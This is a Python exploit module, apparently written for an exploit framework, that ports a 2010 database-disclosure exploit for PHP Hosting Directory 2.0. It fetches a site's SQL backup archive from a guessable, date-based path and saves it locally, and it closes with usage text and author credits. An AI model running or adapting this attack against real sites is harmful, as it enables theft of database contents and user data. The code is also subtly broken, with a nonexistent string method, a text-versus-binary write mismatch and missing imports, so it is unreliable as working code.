from basic import Exploit
import oops

import requests


class TotsModule(Exploit):
    def __init__(self, provided_argument_string=""):
        super().__init__(provided_argument_string)

    def local_arguments(self):
        return [
            {"name": "target", "type": str, "help": "Target for the exploit", "default": "http://SLD.TLD/"},
            {"name": "date", "type": str, "help": "Date DD-MM-YYYY", "default": "16-10-2010"},
            {"name": "database", "type": str, "help": "Database name", "default": "admin/backup/db/backup_db_"},
            {"name": "extension", "type": str, "help": "Archive File Extension", "default": ".sql.gz"},
            {"name": "filelocation", "type": str, "help": "Saved File Location", "default": "/tmp/"},
        ]

    def execute(self):
        if not self.target.startswith("http"):
            raise oops.IncorrectArgument("Your target should look like http://SLD.TLD/")
        if not self.target.endswith("/"):
            self.target = self.target.append("/")

        connection_url = "{target}{database}{date}{extension}".format(target=self.target, database=self.database,
                                                                      date=self.date, extension=self.extension)
        try:
            response = requests.get(connection_url)
            if response.text and response.ok:
                print("Good Job Fam!")
                with open("{filelocation}{filename}{extension}".format(filelocation=self.filelocation,
                                                                       filename="backup_db_{date}".format(
                                                                           date=self.date),
                                                                       extension=self.extension), "wb") as file_handle:
                    file_handle.write(response.text)

        except requests.exceptions.SSLError:
            print("Forbidden Sorry! Server has a Security!")

    def help(self):
        print("""
        "_______________________________________________________________"
        "                                                               "
        " PHP Hosting Directory 2.0 Database Disclosure Exploit (.py)   "
        "                                                               "
        " coded by ZoRLu                                                "
        "                                                               "
        ' usage: %s http://server.com/path/ day-mounth-year' % os.path.basename(sys.argv[0])
        "                                                               "
        " example day-mounth-year for today:                            "
        "                                                               "
        " today: 16-10-2010                                             "
        "                                                               "
        "_______________________________________________________________"

        example: http://www.server.com/ 16-10-2010
        """)

    def thanks(self):
        print("""
        # Title        : PHP Hosting Directory 2.0 Database Disclosure Exploit (.py)

# Author       : ZoRLu / http://inj3ct0r.com/author/577

# mail-msn     : admin@yildirimordulari.com

# Down. Script : -

# Proof        : http://img214.imageshack.us/img214/2407/directory.jpg

# Tested       : Windows XP Professional sp3

# Home         : http://z0rlu.blogspot.com

# Thanks       : http://inj3ct0r.com / http://www.exploit-db.com / http://packetstormsecurity.org / http://shell-storm.org

# Date         : 16/10/2010

# Tesekkur     : r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N

# Lakirdi      : off ulan off / http://www.youtube.com/watch?v=mIdwAz7-cHk

# -*- coding:cp1254 -*-
        """)
